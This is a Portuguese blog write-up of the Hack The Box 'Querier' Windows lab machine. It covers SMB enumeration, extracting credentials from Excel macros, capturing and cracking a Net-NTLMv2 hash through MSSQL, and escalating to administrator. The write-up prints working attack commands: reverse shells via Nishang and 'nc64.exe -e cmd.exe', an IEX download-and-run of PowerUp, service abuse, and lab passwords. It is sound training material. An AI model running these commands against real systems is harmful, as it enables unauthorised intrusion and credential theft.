---
title: "Hack The Box - Querier"
tags: [Windows,Medium,Psexec,PowerUp,Brute Force,Impacket,Nishang]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/175>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 4 portas abertas no servidor

> Portas 135, 139 e 445 - Relativas ao servidor Samba

> Porta 1443 - Banco de dados

## Enumeração da porta 445

Vamos começar a enumerar pelo o que geralmente nos dá acesso, que no caso é o servidor samba que está sendo executado na máquina

### Smbmap

Tentamos o smbmap pra ver se temos alguma permissão

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_querier.png)

Não conseguimos nada, tentamos verificar se é possível conseguir algo com algum usuário inválido, uma vez que ele pode nos dar acesso de guest (dica do `0xdf`)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_smbmap1.png)

Também não conseguimos nada de interessante, a não ser acesso a uma pasta chamada `Reports` que nos chamou atenção

### Smbclient

Também poderiamos ter verificado essas informações com o `smbclient`

> smbclient -L \\10.10.10.125

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_smbclient.png)

### Verificando pasta Reports

Agora vamos verificar do que se trata essa pasta `Reports` e o que podemos extrair de informações dela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_smb.png)

Passamos para nossa máquina o arquivo *Currency Volume Report.xlsm*

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_smb1.png)

### Extraindo informações

Vamos extrair as informações desse arquivo .xlsm de três maneiras, duas manuais e uma com ferramenta

.xlms é uma planilha do Microsoft Excel

#### 1º Modo (Através do Windows)

Sim, só abrir ela no windows e ir nas macros, uma vez que quando eu abro o arquivo ele acusa que tem macros sendo executadas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_win1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_win.png)

Pronto, ai está

#### 2º Modo (oletools)

Também poderiamos utilizar ferramentas que fazem a leitura desses arquivos no Kali, um pacote de ferramentas é o `oletools`

> https://github.com/decalage2/oletools

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_ole.png)

Baixamos ele na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_ole1.png)

Agora executamos no arquivos .xlms

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_ole2.png)

Ai está, a mesma informação

#### 3º Modo (manual)

Também temos o modo manual de descobrir esse login e senha

Por ser um arquivo com macros, nós podemos dezipar o arquivo e verificar manualmente o que tem nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_man.png)

Checando todos os arquivos, encontramos o `vbaProject.bin`, dando um strings nele encontramos a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_man1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_man2.png)

Uid=reporting;Pwd=PcwTWTHRwryjc$c6

Pronto, agora vamos prosseguir

# Explorando MSSQL

Com um usuário e senha podemos nos conectar à database dele com o mssqlclient.py (faz parte da impacket), lembrar de deixar habilitado a flag -windows-auth

Nos conectamos e ganhamos um shell de sql na máquina

> mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql.png)

## Capturar o Hash Net-NTLMv2

A ideia aqui é utilizar da comunicação com o MSSQL para se conectar comigo através do SMB, e eu com o `responder` ligado pego o hash, quebro ele e acesso o servidor com um shell normal... Vamos lá

Primeiro devemos ligar o responder na nossa 

> responder -I tun0

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql1.png)

Agora fazemos a requisição para nossa máquina

> xp_dirtree '\\10.10.16.117\\Querier'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql3.png)

Recebemos o hash

`mssql-svc::QUERIER:f1a5919b89175621:74B2DC303F31158CEDF7B10F20C6658C:0101000000000000C0653150DE09D2018D362D8D637AA1CA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000AD5B98CA462F21D09B843E22C7DE920AD3D9D9E8445E1D8BE063B528962600DF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310031003700000000000000000000000000`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql2.png)

### Quebrando hash (john)

Agora vamos quebrar ele

> john --wordlist=/usr/share/wordlists/rockyou.txt hash

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql4.png)

## Pegando shell

Agora com um usuário e senha, podemos pegar um shell na máquina

> mssqlclient.py mssql-svc:'corporate568'@10.10.10.125 -windows-auth

Verificamos que temos muito mais permissões, uma delas é o `xp_cmdshell` que é um RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql6.png)

Assim, agora eu não posso executar direto o xp_cmdshell eu preciso habilitar ele antes, coisa que eu não consigo fazer com o reporting, a documentação de todos os comandos que eu posso executar com o xp_cmdshell estão em (https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-2017)

Então habilitamos com o `enable_xp_cmdshell` e executamos o `xp_cmdshell whoami` pra comprovar o RCE

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql7.png)

### 1º Modo - Através do Nishang

Primeiro modo que vamos fazer é utilizando o Nishang

> https://github.com/samratashok/nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_ni1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q-ni2.png)

Copiamos ele para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_ni.png)

Colocamos no final do arquivo o comando para ele chamar a função e nos dar um reverse shell

> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.117 -Port 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_ni3.png)

Ligamos nosso `rlwrap nc -nlvp 443`, um Python Web Server e executamos no servidor para nos dar uma shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_sql5.png)

Show, temos uma shell!

### 2º Modo - Através do nc

Vamos fazer de outro modo também essa máquina, pra pegar o shell de user

Primeiro devemos habilitar um smbserver na nossa máquina (pra não precisar jogar la dentro o arquivo)

> smbserver.py -smb2support querier $(pwd)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_s.png)

Agora nos abrimos um nc na porta 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_s1.png)

Agora executamos o comando e recebemos a shell

> xp_cmdshell \\10.10.16.117\querier\nc64.exe -e cmd.exe 10.10.16.117 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_s2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_s3.png)

Vamos escalar privilégio agora

# Escalação de Privilégio (1º Modo - PowerUp.ps1)

Bom uma vez que temos o shell na máquina vamos procurar por meios de escalar privilégio nela, vamos rodar o PowerUp.ps1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p.png)

> https://github.com/HarmJ0y/PowerUp

Indo pras páginas direcionadas chegamos até a última atualização

> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p1.png)

Baixamos pra nossa máquina

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p2.png)

Agora executamos no servidor o script

> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/PowerUp.ps1')

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p3.png)

Agora com o `Invoke-AllChecks` executamos o script (note que ele demora um certo tempo para executar)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p5.png)

Já encontramos o que precisamos! A senha de administrador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_p4.png)

## Winrm

Logamos como administrador com o `evil-winrm`

> evil-winrm -i 10.10.10.125 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_aa.png)

## Psexec

Logamos como administrador com o `psexec.py`

> psexec.py Administrator@10.10.10.125

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_aa1.png)

Vamos explorar outras maneiras de se encontrar essa senha de administrador

# Escalação de Privilégio (2º Modo - Manual)

Outras coisas interessantes nessa máquina
Como por exemplo descobrir de onde que veio essas credenciais
O windows pegou por bem "guardar" senhas em groups policies de maneira "criptografada" só que disponibilizou a chave.

Essas group policies ficam no diretório `programdata`

`cmd.exe /c "dir /s /b | findstr Group"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_g.png)

Lemos a policy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_g1.png)

Passamos pa Kali e com o `gpp-decrypt` conseguimos a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_g2.png)

Também há outras ferramentas para realização da decrytação da senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_g3.png)

Copiamos pra máquina
Podemos ver a chave "key" no código, chave que foi utilizada para "criptografar"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_g4.png)

Rodamos e pegamos a senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_g5.png)

# Escalação de Privilégio (3º Modo - Abusando de Serviços)

Outro modo de escalar é mudando a senha do administrador
Ao rodar o PowerUp.ps1 com o Invoke-AllChecks verificamos que um serviço tem permissões que podem ser exploradas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_c.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_c1.png)

No caso ele criou um usuário no grupo dos administradores
john:Password123!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_c2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_c3.png)

Bom, sabendo que podemos criar usuário, podemos também executar comandos como administrador, pelo mesmo princípio. Então vamos fazer ele executar um nc.exe na minha Kali (pelo smbserver) e me dar um shell de authority

Primeiro ativo o smbserver

> smbserver.py -smb2support querier $(pwd)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_v.png)

Agora executo o comando `Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.16.117\querier\nc64.exe -e cmd.exe 10.10.16.117 443"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_v1.png)

Também podemos mudar a senha do administrador

# Escalação de Privilégio (4º Modo - Mudando a senha de administrador)

Bom, outro modo é mudando a senha do administrador da máquina

> Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'net user administrator senha'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_v2.png)

Alteramos a senha dele para 'senha'

Bom, agora já chega...

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-querier/Q_user.png)